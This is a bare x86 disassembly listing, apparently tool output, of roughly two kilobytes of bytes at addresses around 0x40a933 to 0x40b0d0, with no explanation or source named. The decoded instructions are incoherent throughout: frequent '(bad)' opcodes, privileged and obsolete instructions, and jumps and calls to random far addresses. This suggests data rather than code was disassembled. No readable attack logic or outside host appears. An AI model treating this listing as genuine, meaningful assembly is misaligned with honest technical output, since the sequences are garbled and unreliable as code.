  40a933:	enter  0xe755,0xf7
  40a937:	lock (bad) 
  40a939:	push   esi
  40a93a:	inc    eax
  40a93b:	jl     0x40a921
  40a93d:	xchg   edi,eax
  40a93e:	outs   dx,DWORD PTR ds:[esi]
  40a93f:	bound  ebp,QWORD PTR [ebx]
  40a941:	fnstsw WORD PTR [ebx+ecx*8+0x5b]
  40a945:	pushf  
  40a946:	das    
  40a947:	ins    DWORD PTR es:[edi],dx
  40a948:	iret   
  40a949:	mov    ebp,DWORD PTR [ebx-0x35]
  40a94c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a94d:	mov    WORD PTR [esi+esi*2+0x6ca22de9],cs
  40a954:	and    al,0xc9
  40a956:	inc    esp
  40a957:	or     dl,BYTE PTR [eax+0x72]
  40a95a:	pop    es
  40a95b:	inc    esi
  40a95c:	arpl   WORD PTR [edi+0x6f],cx
  40a95f:	dec    esi
  40a960:	xchg   esp,eax
  40a961:	sub    al,0x77
  40a963:	pop    esi
  40a964:	jp     0x40a94b
  40a966:	pop    esp
  40a967:	inc    ebp
  40a968:	rol    DWORD PTR [ebx-0x4400809a],0xe0
  40a96f:	mov    ds:0xc789d9de,al
  40a974:	call   0xc849d487
  40a979:	or     BYTE PTR [edx+0x25],bh
  40a97c:	gs pop edx
  40a97e:	sub    al,0x17
  40a980:	mov    DWORD PTR [edi+0x79b3c436],ebx
  40a986:	inc    eax
  40a987:	das    
  40a988:	(bad)  
  40a989:	cmp    DWORD PTR [ecx-0x74],ebp
  40a98c:	aam    0x85
  40a98e:	pop    ds
  40a98f:	jge    0x40a93d
  40a991:	mov    bl,0x5e
  40a993:	mov    ecx,0x9f07ce78
  40a998:	and    eax,DWORD PTR [ebx]
  40a99a:	imul   eax,esp,0x77b39331
  40a9a0:	sbb    eax,0xdf18b4b3
  40a9a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9a6:	dec    ebp
  40a9a7:	cmp    edx,edx
  40a9a9:	ins    BYTE PTR es:[edi],dx
  40a9aa:	jp     0x40a94f
  40a9ac:	add    dh,BYTE PTR [ecx-0x34bcb171]
  40a9b2:	rol    BYTE PTR [esi],cl
  40a9b4:	bound  esi,QWORD PTR [edi-0x80]
  40a9b7:	mov    ecx,DWORD PTR [ebx]
  40a9b9:	ja     0x40a9e3
  40a9bb:	push   ds
  40a9bc:	adc    eax,0x4fb4f8df
  40a9c1:	call   0x8c26d71f
  40a9c6:	das    
  40a9c7:	(bad)  
  40a9c9:	jle    0x40a97c
  40a9cb:	daa    
  40a9cc:	sub    ecx,ebx
  40a9ce:	push   esp
  40a9cf:	jae    0x40a96f
  40a9d1:	iret   
  40a9d2:	iret   
  40a9d3:	mov    cl,BYTE PTR [eax+edi*8]
  40a9d6:	jmp    0x24defc98
  40a9db:	aam    0x9d
  40a9dd:	mov    dl,BYTE PTR [edx+0x44d4f117]
  40a9e3:	or     DWORD PTR [eax-0x26e60800],esi
  40a9e9:	fidiv  WORD PTR ds:0x2cfd6ad6
  40a9ef:	cli    
  40a9f0:	cmp    dl,BYTE PTR [edi]
  40a9f2:	pop    ds
  40a9f3:	test   DWORD PTR [eax-0x47],edx
  40a9f6:	jmp    0x34fe6f7d
  40a9fb:	dec    ebx
  40a9fc:	jb     0x40aa4f
  40a9fe:	jnp    0x40a9b8
  40aa00:	or     eax,0x6af5ddc5
  40aa05:	in     al,0xd7
  40aa07:	data16 add al,BYTE PTR [edi-0x35]
  40aa0b:	les    ebx,FWORD PTR [eax+edi*4]
  40aa0e:	scas   eax,DWORD PTR es:[edi]
  40aa0f:	loope  0x40aa52
  40aa11:	jns    0x40a9ce
  40aa13:	jmp    0x40a9ab
  40aa15:	stc    
  40aa16:	shr    dl,cl
  40aa18:	lds    ebx,FWORD PTR [eax]
  40aa1a:	es rsm 
  40aa1d:	lahf   
  40aa1e:	jae    0x40aa6c
  40aa20:	and    bl,BYTE PTR [edx-0x47e09505]
  40aa26:	popf   
  40aa27:	aam    0x9e
  40aa29:	(bad)  
  40aa2a:	and    BYTE PTR [ebp+0x67ac3f4d],bl
  40aa30:	sub    eax,0x1db6032c
  40aa35:	mov    bl,0x23
  40aa37:	ret    
  40aa38:	sub    al,0xa6
  40aa3a:	add    eax,0xaccf4a08
  40aa3f:	xchg   esp,eax
  40aa40:	or     eax,0x86d34b53
  40aa45:	add    ebp,ecx
  40aa47:	mov    esi,0x70052617
  40aa4c:	fsubr  QWORD PTR [eax]
  40aa4e:	sub    DWORD PTR [esi-0x22],esi
  40aa51:	and    BYTE PTR [ebx],0x70
  40aa54:	xor    eax,0x8a7db2b1
  40aa59:	mov    bh,dl
  40aa5b:	and    eax,0x3b44d1fb
  40aa60:	es push 0x7d021e86
  40aa66:	mov    esi,0x6effa1d1
  40aa6b:	xor    al,bh
  40aa6d:	not    esp
  40aa6f:	scas   al,BYTE PTR es:[edi]
  40aa70:	mov    edi,0x7f26213b
  40aa75:	mov    WORD PTR [edi+0x19],ds
  40aa78:	(bad)  
  40aa79:	push   ds
  40aa7a:	inc    ebp
  40aa7b:	lods   al,BYTE PTR ds:[esi]
  40aa7c:	ficom  DWORD PTR [edi+ebp*2+0x58]
  40aa80:	push   ds
  40aa81:	adc    BYTE PTR [edi],0xc8
  40aa84:	pushf  
  40aa85:	cmp    edi,edx
  40aa87:	jge    0x40ab04
  40aa89:	sub    bh,BYTE PTR [eax-0x52]
  40aa8c:	nop
  40aa8d:	sbb    BYTE PTR [ebp+0x156585bb],ch
  40aa93:	or     BYTE PTR [ebp-0x3a],0xf8
  40aa97:	xchg   ecx,eax
  40aa98:	sbb    bl,BYTE PTR [edi-0x4d3fe530]
  40aa9e:	(bad)  
  40aa9f:	fs pop cx
  40aaa2:	and    ch,al
  40aaa4:	cmp    ebp,DWORD PTR [ebx+0x6df315ed]
  40aaaa:	jmp    0x40aa92
  40aaac:	jno    0x40ab02
  40aaae:	adc    ebx,0x321f61d2
  40aab4:	and    BYTE PTR ds:0xac692277,bl
  40aaba:	pop    edi
  40aabb:	sub    BYTE PTR [ebp+0x78],ch
  40aabe:	cld    
  40aabf:	in     eax,0xa
  40aac1:	mov    esi,ebp
  40aac3:	adc    eax,0xa3180f97
  40aac8:	fsubr  DWORD PTR [eax]
  40aaca:	xor    BYTE PTR [ecx],0x79
  40aacd:	call   0x18e3337e
  40aad2:	and    DWORD PTR [esi-0x55],0x47e905b0
  40aad9:	and    edx,eax
  40aadb:	or     BYTE PTR [ebp+0x6a],dl
  40aade:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aadf:	bound  ebp,QWORD PTR [ebp+0x5142a4ec]
  40aae5:	pop    edx
  40aae6:	sbb    eax,DWORD PTR ds:0x810e0fb3
  40aaec:	bound  ebx,QWORD PTR gs:[ebx]
  40aaef:	sahf   
  40aaf0:	idiv   BYTE PTR [eax+0xb]
  40aaf3:	jg     0x40aab8
  40aaf5:	add    bh,bl
  40aaf7:	sub    bl,0xdc
  40aafa:	sub    al,BYTE PTR [esi-0x1f]
  40aafd:	sbb    eax,0x5332e0de
  40ab02:	sbb    al,0x7b
  40ab04:	arpl   si,di
  40ab06:	mov    dl,0x93
  40ab08:	js     0x40ab77
  40ab0a:	stos   BYTE PTR es:[edi],al
  40ab0b:	das    
  40ab0c:	dec    eax
  40ab0d:	xchg   ebx,eax
  40ab0e:	and    al,0x35
  40ab10:	shl    BYTE PTR cs:[esi-0x41cca447],0x6
  40ab18:	jb     0x40aaf2
  40ab1a:	sar    DWORD PTR [edx-0x5d773771],0x3d
  40ab21:	cmp    ch,BYTE PTR [edx-0x5e]
  40ab24:	(bad)  
  40ab25:	lods   eax,DWORD PTR ds:[esi]
  40ab26:	dec    edi
  40ab27:	push   es
  40ab28:	mov    bl,0x8f
  40ab2a:	or     eax,0x5c37ad67
  40ab2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab30:	neg    dl
  40ab32:	mov    al,0xf2
  40ab34:	jae    0x40ab72
  40ab36:	shl    DWORD PTR [edx+0x33],1
  40ab39:	dec    ecx
  40ab3a:	dec    esp
  40ab3b:	sub    eax,0x979b7c49
  40ab40:	fnstsw WORD PTR [ecx]
  40ab42:	inc    ecx
  40ab43:	leave  
  40ab44:	ins    DWORD PTR es:[edi],dx
  40ab45:	call   FWORD PTR [edx+eax*4+0x5274993]
  40ab4c:	dec    esp
  40ab4d:	loopne 0x40ab57
  40ab4f:	xchg   ah,dh
  40ab51:	and    eax,0x5f547f52
  40ab56:	bound  ebp,QWORD PTR [ebp-0x66]
  40ab59:	dec    ebp
  40ab5a:	fndisi(8087 only) 
  40ab5c:	rol    DWORD PTR [ecx-0x401edbf7],1
  40ab62:	(bad)  
  40ab63:	outs   dx,DWORD PTR ds:[esi]
  40ab64:	sahf   
  40ab65:	mov    dh,0x8e
  40ab67:	cld    
  40ab68:	mov    esp,0x8709e849
  40ab6d:	push   cs
  40ab6e:	or     eax,0x8a660e7
  40ab73:	jmp    0x40ab3c
  40ab75:	lea    ecx,[eax+0x4d992e1a]
  40ab7b:	aam    0xf6
  40ab7d:	xchg   ebp,eax
  40ab7e:	mov    cl,0x5d
  40ab80:	adc    ecx,edi
  40ab82:	mov    ds:0xdc06d57f,eax
  40ab87:	and    ecx,DWORD PTR [ebx-0x61d0b228]
  40ab8d:	pop    edx
  40ab8e:	pop    ecx
  40ab8f:	jae    0x40ab2e
  40ab91:	mov    ebx,0xdc1acf19
  40ab96:	pop    ss
  40ab97:	mov    ah,cl
  40ab99:	aas    
  40ab9a:	retf   0xa186
  40ab9d:	call   0x61e3d376
  40aba2:	pop    ebp
  40aba3:	in     eax,dx
  40aba4:	repz (bad) 
  40aba6:	das    
  40aba7:	scas   eax,DWORD PTR es:[edi]
  40aba8:	xchg   ecx,eax
  40aba9:	sahf   
  40abaa:	addr16 mov eax,ds:0x6888
  40abae:	adc    al,0x9e
  40abb0:	pop    ds
  40abb1:	or     dl,ch
  40abb3:	es pop esi
  40abb5:	dec    edi
  40abb6:	xchg   esi,eax
  40abb7:	adc    DWORD PTR [edx-0x3e404a72],edi
  40abbd:	sbb    esp,DWORD PTR [esi-0x1f]
  40abc0:	dec    ebx
  40abc1:	mov    DWORD PTR [edx+0x8],0xfe49f02a
  40abc8:	adc    al,0x39
  40abca:	lds    edx,FWORD PTR [edi+0xd2779c0]
  40abd0:	sub    al,0x11
  40abd2:	push   ecx
  40abd3:	dec    esp
  40abd4:	adc    esi,ebp
  40abd6:	retf   0x11c8
  40abd9:	lods   al,BYTE PTR ds:[esi]
  40abda:	ja     0x40abed
  40abdc:	cmp    DWORD PTR [edx+0x4f5ab0c5],esp
  40abe2:	pushf  
  40abe3:	pop    ebx
  40abe4:	retf   
  40abe5:	jle    0x40abc9
  40abe7:	aas    
  40abe8:	pop    ds
  40abe9:	nop
  40abea:	cmp    eax,0xfd5c8e20
  40abef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abf0:	push   es
  40abf1:	push   edi
  40abf2:	jge    0x40ab99
  40abf4:	hlt    
  40abf5:	mov    ah,0x41
  40abf7:	mov    bl,0x12
  40abf9:	xor    eax,0x17caf732
  40abfe:	in     eax,dx
  40abff:	sahf   
  40ac00:	dec    esi
  40ac01:	ins    BYTE PTR es:[edi],dx
  40ac02:	div    DWORD PTR [ebp+0x7a]
  40ac05:	cmp    ecx,DWORD PTR [edi-0xb]
  40ac08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac09:	xchg   DWORD PTR [ebx-0x27],ecx
  40ac0c:	inc    ebx
  40ac0d:	bound  edi,QWORD PTR [ebp+0x30d4a5f]
  40ac13:	or     eax,0xb236918e
  40ac18:	jne    0x40ac84
  40ac1a:	outs   dx,BYTE PTR ds:[esi]
  40ac1b:	cmp    dh,BYTE PTR [ebx+eax*2-0x699f5c81]
  40ac22:	push   es
  40ac23:	or     al,0x33
  40ac25:	mov    eax,0xfe82e26f
  40ac2a:	in     al,dx
  40ac2b:	cmp    al,0x7c
  40ac2d:	cdq    
  40ac2e:	fistp  WORD PTR [edi+0x660466f8]
  40ac34:	mov    eax,ds:0x25fd92cd
  40ac39:	(bad)  
  40ac3a:	dec    esp
  40ac3b:	and    eax,DWORD PTR [esi]
  40ac3d:	mov    ebx,0xdedf3369
  40ac42:	(bad)  
  40ac43:	sbb    BYTE PTR [eax+0x3f9f3698],al
  40ac49:	or     BYTE PTR ds:0x225b9aae,bh
  40ac4f:	test   bl,cl
  40ac51:	push   ebx
  40ac52:	mov    ch,0xd0
  40ac54:	fdiv   DWORD PTR [ecx]
  40ac56:	push   edi
  40ac57:	test   ah,dl
  40ac59:	sbb    al,0x7c
  40ac5b:	xor    eax,0xf7dc64af
  40ac60:	adc    BYTE PTR [eax],ah
  40ac62:	test   edx,ecx
  40ac64:	xchg   ecx,eax
  40ac65:	les    esi,FWORD PTR [ebx+0x7e]
  40ac68:	jle    0x40ac01
  40ac6a:	inc    BYTE PTR [ebp-0x5861e61e]
  40ac70:	dec    BYTE PTR [esi]
  40ac72:	pop    ds
  40ac73:	lea    esi,[edi+0x55f71298]
  40ac79:	ret    0x7cf
  40ac7c:	test   eax,0x80df8a0f
  40ac81:	test   DWORD PTR [edi],esp
  40ac83:	xor    eax,0x87a1cfd6
  40ac88:	mov    dl,0x43
  40ac8a:	push   ebp
  40ac8b:	inc    ebp
  40ac8c:	fimul  DWORD PTR [esi]
  40ac8e:	mov    edi,0x29b87c6a
  40ac93:	rol    BYTE PTR [ecx],1
  40ac95:	sti    
  40ac96:	xchg   edi,eax
  40ac97:	(bad)  
  40ac98:	cmp    edi,DWORD PTR [edi]
  40ac9a:	sti    
  40ac9b:	ins    DWORD PTR es:[edi],dx
  40ac9c:	mov    bh,0xb
  40ac9e:	mov    eax,ds:0x9af170ae
  40aca3:	fs (bad) 
  40aca5:	cmp    BYTE PTR [eax+0x34],cl
  40aca8:	je     0x40ad17
  40acaa:	icebp  
  40acab:	mov    ?,WORD PTR [ecx-0x72]
  40acae:	mov    eax,0xc362c39c
  40acb3:	jecxz  0x40acfe
  40acb5:	xor    bh,bl
  40acb7:	fdiv   st,st(1)
  40acb9:	mov    al,ds:0x59ae18cc
  40acbe:	and    BYTE PTR [eax-0x15886150],cl
  40acc4:	call   0x4bce:0xb1139079
  40accb:	mov    al,ds:0xc6c553ba
  40acd0:	ret    
  40acd1:	xchg   ecx,eax
  40acd2:	das    
  40acd3:	mov    edi,0xba520979
  40acd8:	call   0x7bc38f2f
  40acdd:	jp     0x40ace2
  40acdf:	mov    DWORD PTR [esi+edi*1+0x66],edx
  40ace3:	and    al,0x72
  40ace5:	jmp    0x40ad17
  40ace7:	mov    cl,0xd1
  40ace9:	push   esp
  40acea:	lock cmp BYTE PTR [edi+edx*2-0xd],bh
  40acef:	mov    dh,0x97
  40acf1:	mov    esp,0xfa09553a
  40acf6:	mov    dl,0xab
  40acf8:	sbb    DWORD PTR [ebx+edx*1-0x160384c0],edx
  40acff:	mov    bl,BYTE PTR ss:[esi]
  40ad02:	pop    esi
  40ad03:	aad    0x6
  40ad05:	adc    BYTE PTR [edx-0xf],ah
  40ad08:	jnp    0x40ad29
  40ad0a:	(bad)  
  40ad0b:	jl     0x40ad20
  40ad0d:	mov    eax,0xe1ef67bb
  40ad12:	(bad)  
  40ad13:	cmp    al,0xc8
  40ad15:	inc    ebx
  40ad16:	out    0xe6,eax
  40ad18:	out    dx,eax
  40ad19:	into   
  40ad1a:	pop    edi
  40ad1b:	lea    ebp,[esp+eiz*8-0x789ddd6e]
  40ad22:	pop    ecx
  40ad23:	ret    
  40ad24:	fmul   DWORD PTR [ecx+0xafa7cf6]
  40ad2a:	push   0x22
  40ad2c:	fs test bl,0xfb
  40ad30:	icebp  
  40ad31:	das    
  40ad32:	adc    DWORD PTR ds:0x2f602d0c,ebx
  40ad38:	iret   
  40ad39:	(bad)
  40ad3c:	cli    
  40ad3d:	dec    eax
  40ad3e:	or     eax,0x7cf04ac1
  40ad43:	pushf  
  40ad44:	push   esp
  40ad45:	add    ah,BYTE PTR [ebx+0x4d]
  40ad48:	lahf   
  40ad49:	cmp    eax,0xfddedaff
  40ad4e:	shl    BYTE PTR [edx-0x296bea84],cl
  40ad54:	sbb    DWORD PTR [eax+0x5fd3124d],esp
  40ad5a:	pop    es
  40ad5b:	jecxz  0x40acf9
  40ad5d:	in     eax,0x96
  40ad5f:	rol    BYTE PTR [esi+0x7440b2f],cl
  40ad65:	pop    esp
  40ad66:	mov    dl,0x3f
  40ad68:	dec    eax
  40ad69:	js     0x40ada2
  40ad6b:	jbe    0x40ad01
  40ad6d:	mov    ?,WORD PTR [edx+ebp*8+0x52]
  40ad71:	mov    edx,0x131b55b9
  40ad76:	std    
  40ad77:	rol    DWORD PTR [si],1
  40ad7a:	fidiv  DWORD PTR [esi]
  40ad7c:	rcl    DWORD PTR [ecx+0x35753df5],cl
  40ad82:	es pushf 
  40ad84:	jge    0x40ad60
  40ad86:	pop    esp
  40ad87:	std    
  40ad88:	mov    ds:0x49db0053,al
  40ad8d:	mov    dl,0xc2
  40ad8f:	shr    BYTE PTR [ebp+0x23],0x81
  40ad93:	test   BYTE PTR [edx+0x1508e986],0xcb
  40ad9a:	cmp    edi,DWORD PTR [edi-0x4f]
  40ad9d:	ret    0x29ee
  40ada0:	jp     0x40ad73
  40ada2:	adc    eax,0xc9e11b53
  40ada7:	and    eax,0xa7a75629
  40adac:	hlt    
  40adad:	mov    ebp,0x464e6363
  40adb2:	jnp    0x40ae1b
  40adb4:	push   edx
  40adb5:	add    BYTE PTR [esp+edx*8-0x67],dh
  40adb9:	lods   al,BYTE PTR ds:[esi]
  40adba:	icebp  
  40adbb:	iret   
  40adbc:	xor    BYTE PTR [esi-0x21cff0b3],cl
  40adc2:	in     eax,dx
  40adc3:	mov    edi,0x52125d3c
  40adc8:	push   esi
  40adc9:	out    dx,al
  40adca:	scas   eax,DWORD PTR es:[edi]
  40adcb:	lds    esi,FWORD PTR [edi-0x79]
  40adce:	icebp  
  40adcf:	call   0xe55d:0x1324f80
  40add6:	or     eax,eax
  40add8:	sti    
  40add9:	xchg   ebp,eax
  40adda:	and    dh,BYTE PTR [eax+eax*2-0x737db7dd]
  40ade1:	jle    0x40ae5a
  40ade3:	sbb    al,0x99
  40ade5:	std    
  40ade6:	mov    cl,0x0
  40ade8:	push   ebx
  40ade9:	adc    eax,0x5052dec9
  40adee:	fcmovne st,st(4)
  40adf0:	ja     0x40adec
  40adf2:	mov    dh,0x86
  40adf4:	sbb    DWORD PTR [esi+0x73e2849e],0xffffffba
  40adfb:	cmp    ebx,DWORD PTR [esi-0x25]
  40adfe:	(bad)
  40ae01:	xor    esi,DWORD PTR ds:0x3b24e121
  40ae07:	test   DWORD PTR [esi+eiz*4-0x20],ecx
  40ae0b:	pop    edi
  40ae0c:	mov    esi,0x6a6df3cf
  40ae11:	lea    ebx,ds:0xd350b828
  40ae17:	ds xchg edx,eax
  40ae19:	mov    ch,0x4c
  40ae1b:	in     al,dx
  40ae1c:	div    DWORD PTR [ecx-0x4fe1ff3f]
  40ae22:	push   ecx
  40ae23:	xchg   ebx,eax
  40ae24:	pop    esi
  40ae25:	rol    BYTE PTR [ebp-0xd],0x4b
  40ae29:	cli    
  40ae2a:	sub    al,0x89
  40ae2c:	ins    DWORD PTR es:[edi],dx
  40ae2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae2e:	sbb    DWORD PTR [edi-0x2f],eax
  40ae31:	and    eax,0xca266bb7
  40ae36:	ret    0x3b97
  40ae39:	imul   ebp,DWORD PTR [esi],0x3ec153e0
  40ae3f:	out    dx,al
  40ae40:	hlt    
  40ae41:	or     ch,BYTE PTR [esi]
  40ae43:	ret    
  40ae44:	push   0x48d1426e
  40ae49:	cmp    BYTE PTR [eax],ch
  40ae4b:	cmp    BYTE PTR [ebp-0x4a],al
  40ae4e:	xchg   ebx,eax
  40ae4f:	xchg   esp,eax
  40ae50:	mov    fs,WORD PTR [ecx+0x58]
  40ae53:	(bad)  
  40ae55:	pop    ebx
  40ae56:	dec    ebx
  40ae57:	ins    DWORD PTR es:[edi],dx
  40ae58:	mov    esp,0xcb570256
  40ae5d:	popa   
  40ae5e:	xor    dl,BYTE PTR [edx]
  40ae60:	push   esp
  40ae61:	sti    
  40ae62:	rcr    ah,cl
  40ae64:	stos   DWORD PTR es:[edi],eax
  40ae65:	dec    ebp
  40ae66:	ja     0x40ae6c
  40ae68:	dec    edx
  40ae69:	fiadd  DWORD PTR [esi-0x403a5650]
  40ae6f:	pop    es
  40ae70:	loop   0x40ae79
  40ae72:	mov    ecx,0xc8bacfa8
  40ae77:	add    edi,DWORD PTR [si]
  40ae7a:	bound  edx,QWORD PTR ds:[eax+0x1ca8aca4]
  40ae81:	std    
  40ae82:	rcr    edi,1
  40ae84:	jmp    0xa1fc4ca
  40ae89:	inc    esi
  40ae8a:	enter  0x5ba3,0x1
  40ae8e:	clc    
  40ae8f:	mov    DWORD PTR [edi+0x12],esp
  40ae92:	scas   al,BYTE PTR es:[edi]
  40ae93:	stos   DWORD PTR es:[edi],eax
  40ae94:	int3   
  40ae95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae96:	call   0x10681a78
  40ae9b:	ds aam 0xf4
  40ae9e:	push   0x16
  40aea0:	sub    DWORD PTR [ebp-0xfd61bf5],esp
  40aea6:	adc    eax,0x33c25374
  40aeab:	and    DWORD PTR [ecx+0x55],ebp
  40aeae:	aam    0xbb
  40aeb0:	pop    eax
  40aeb1:	mov    ah,0x51
  40aeb3:	xor    al,0x18
  40aeb5:	jae    0x40af02
  40aeb7:	sahf   
  40aeb8:	xor    al,0x61
  40aeba:	wbinvd 
  40aebc:	aas    
  40aebd:	or     ebx,DWORD PTR [edi]
  40aebf:	mov    edx,0xc1edf678
  40aec4:	lock push 0x408367ea
  40aeca:	pop    eax
  40aecb:	cli    
  40aecc:	and    dh,BYTE PTR [edi]
  40aece:	or     al,0x6c
  40aed0:	jg     0x40aea0
  40aed2:	aas    
  40aed3:	jp     0x40ae87
  40aed5:	rcr    DWORD PTR [esi+ebp*2-0x36],cl
  40aed9:	jle    0x40af0c
  40aedb:	ja     0x40af29
  40aedd:	sub    esp,DWORD PTR [edx+edx*4-0x36]
  40aee1:	jns    0x40ae90
  40aee3:	mov    ds:0x37314ff0,eax
  40aee8:	cmp    edx,DWORD PTR [esi+ebx*2+0x40]
  40aeec:	stc    
  40aeed:	xlat   BYTE PTR ds:[ebx]
  40aeee:	mov    BYTE PTR [eax-0x11],dh
  40aef1:	add    BYTE PTR [edx-0xe],bl
  40aef4:	cmp    cl,BYTE PTR [edi-0x3471602c]
  40aefa:	hlt    
  40aefb:	sub    BYTE PTR [ecx-0x39],0x6c
  40aeff:	lock icebp 
  40af01:	cwde   
  40af02:	imul   DWORD PTR [ebp-0x74c8db0]
  40af08:	sub    ch,BYTE PTR [eax+ebp*2]
  40af0b:	fwait
  40af0c:	cmp    DWORD PTR ds:0x9af792d4,edx
  40af12:	mov    esi,0xe9a25fc3
  40af17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af18:	or     al,bl
  40af1a:	or     BYTE PTR [esi+eax*8-0x39],bl
  40af1e:	mov    dl,0x37
  40af20:	dec    ebp
  40af21:	jge    0x40af3e
  40af23:	pop    ebp
  40af24:	repnz inc ecx
  40af26:	jmp    0xeb0e504e
  40af2b:	jge    0x40aef5
  40af2d:	or     DWORD PTR [ebx-0x3],edi
  40af30:	in     al,0x13
  40af32:	or     eax,0xa6c4f7f8
  40af37:	and    BYTE PTR [edx-0x1a55d4e7],al
  40af3d:	ja     0x40af72
  40af3f:	bound  ebx,QWORD PTR [eax]
  40af41:	lods   al,BYTE PTR ds:[esi]
  40af42:	shl    DWORD PTR [edi+0x2e6e9616],1
  40af48:	pop    edx
  40af49:	lods   al,BYTE PTR ds:[esi]
  40af4a:	dec    esi
  40af4b:	lods   eax,DWORD PTR ds:[esi]
  40af4c:	jmp    0x44c3a632
  40af51:	(bad)  
  40af52:	cs out 0xfa,eax
  40af55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af56:	pop    edi
  40af57:	jmp    0x40aef7
  40af59:	fbstp  TBYTE PTR [edx+0xdf4a9db]
  40af5f:	mov    eax,ds:0xa4ffa72b
  40af64:	adc    esp,0x88cdd4bb
  40af6a:	push   esp
  40af6b:	sahf   
  40af6c:	addr16 xor eax,0xcd646d4d
  40af72:	mov    cl,0x33
  40af74:	push   esp
  40af75:	xchg   ecx,eax
  40af76:	sub    dh,BYTE PTR [ebp-0x2e]
  40af79:	mov    dl,0x5d
  40af7b:	inc    esi
  40af7c:	add    edi,ecx
  40af7e:	(bad)  
  40af80:	mov    ch,0x12
  40af82:	imul   ebp,edi,0x4c015ada
  40af88:	push   esi
  40af89:	cmp    al,bl
  40af8b:	push   0x7d5f46b7
  40af90:	fwait
  40af91:	in     eax,0x28
  40af93:	add    edi,DWORD PTR [edi]
  40af95:	jmp    0xa1b2:0x488e4061
  40af9c:	out    dx,al
  40af9d:	neg    BYTE PTR [ecx]
  40af9f:	sti    
  40afa0:	lods   eax,DWORD PTR ds:[esi]
  40afa1:	dec    esi
  40afa2:	mov    eax,ds:0x9177d9a3
  40afa7:	int3   
  40afa8:	fdivr  QWORD PTR [esi+eiz*1+0x110a59d4]
  40afaf:	sub    al,0x15
  40afb1:	and    BYTE PTR [eax-0x2dc876aa],bl
  40afb7:	mov    gs,WORD PTR [edi+0x31be4878]
  40afbd:	es jns 0x40b007
  40afc0:	mov    ds:0xe41ceab1,al
  40afc5:	sbb    ecx,DWORD PTR [edi+0x548987f0]
  40afcb:	xchg   ebp,eax
  40afcc:	adc    esi,ebx
  40afce:	mov    eax,0xcd874d25
  40afd3:	leave  
  40afd4:	in     eax,0x85
  40afd6:	outs   dx,DWORD PTR ds:[esi]
  40afd7:	sub    DWORD PTR [edi-0x27],ebx
  40afda:	xchg   edi,eax
  40afdb:	lea    edx,[ebx-0x40]
  40afde:	mov    dh,0x68
  40afe0:	dec    edx
  40afe1:	pop    edi
  40afe2:	push   ds
  40afe3:	push   ss
  40afe4:	or     DWORD PTR [edx+0xc],ecx
  40afe7:	and    cl,BYTE PTR [edi-0x144d7645]
  40afed:	jmp    0xee450189
  40aff2:	sahf   
  40aff3:	or     esi,DWORD PTR [edi]
  40aff5:	dec    esp
  40aff6:	pop    esp
  40aff7:	pop    ss
  40aff8:	cli    
  40aff9:	mov    ch,BYTE PTR [edi]
  40affb:	push   ebx
  40affc:	mov    esp,0xa8ad6cc1
  40b001:	lods   eax,DWORD PTR ds:[esi]
  40b002:	or     BYTE PTR [edx+0x4c612894],0x95
  40b009:	add    ebp,DWORD PTR [edx]
  40b00b:	push   ss
  40b00c:	mov    edx,0xaf214f46
  40b011:	and    esi,eax
  40b013:	mov    ds,WORD PTR [edx+0x13b5f475]
  40b019:	sub    BYTE PTR [ebx+ecx*1],cl
  40b01c:	xor    BYTE PTR [edx+0x496d6d6b],dl
  40b022:	aad    0x40
  40b024:	cmp    DWORD PTR [ebp-0xf7d22e1],0xf1798909
  40b02e:	rcr    BYTE PTR [ecx-0x5757382a],0xe4
  40b035:	adc    ah,BYTE PTR [ebp+0x48]
  40b038:	les    eax,FWORD PTR [ecx]
  40b03a:	xor    al,0x34
  40b03c:	rcl    DWORD PTR [edx-0x3],1
  40b03f:	add    ah,BYTE PTR [edi+0x38]
  40b042:	aam    0x25
  40b044:	fs rcl cl,0x1a
  40b048:	xchg   BYTE PTR [edi+edx*2+0x28750c67],ch
  40b04f:	rcr    al,cl
  40b051:	(bad)  
  40b052:	dec    ebx
  40b053:	add    al,0xc1
  40b055:	mov    ds:0x2879da5,eax
  40b05a:	mov    esi,0xa6070de9
  40b05f:	inc    esi
  40b060:	pusha  
  40b061:	retf   0xf327
  40b064:	addr16 xchg ecx,eax
  40b066:	or     DWORD PTR [eax],esp
  40b068:	(bad)  
  40b069:	into   
  40b06a:	daa    
  40b06b:	xchg   esi,eax
  40b06c:	inc    esi
  40b06d:	push   0xfffffff9
  40b06f:	add    esi,ecx
  40b071:	cs je  0x40b0bb
  40b074:	mov    edx,0xefe7aba8
  40b079:	cmp    DWORD PTR [ecx],0x16a2e832
  40b07f:	int    0x25
  40b081:	adc    al,0xa8
  40b083:	dec    ebp
  40b084:	xor    BYTE PTR [edx],al
  40b086:	inc    edx
  40b087:	ins    DWORD PTR es:[edi],dx
  40b088:	sub    DWORD PTR [edi+0x32272d56],edi
  40b08e:	outs   dx,BYTE PTR ds:[esi]
  40b08f:	outs   dx,BYTE PTR ds:[esi]
  40b090:	imul   esi,DWORD PTR [edi-0x56],0x8
  40b094:	imul   edi,DWORD PTR [eax],0x46
  40b097:	or     eax,0xdb92e491
  40b09c:	loopne 0x40b063
  40b09e:	aaa    
  40b09f:	sbb    ebp,edi
  40b0a1:	call   0x905c:0x187f1043
  40b0a8:	push   esp
  40b0a9:	inc    ebp
  40b0aa:	lea    ecx,[eax-0x4cad6f7e]
  40b0b0:	cmp    BYTE PTR [eax],bl
  40b0b2:	retf   0xdc20
  40b0b5:	xchg   BYTE PTR [ecx],ch
  40b0b7:	sbb    BYTE PTR [esi-0x4c],cl
  40b0ba:	pop    ebp
  40b0bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0bc:	out    dx,eax
  40b0bd:	aaa    
  40b0be:	std    
  40b0bf:	add    DWORD PTR [edi+edi*8-0x47e22975],ebp
  40b0c6:	adc    esi,esp
  40b0c8:	cmp    DWORD PTR [ebx+0x25fa8248],ecx
  40b0ce:	jmp    0x40b075
  40b0d0:	sbb    bl,dl
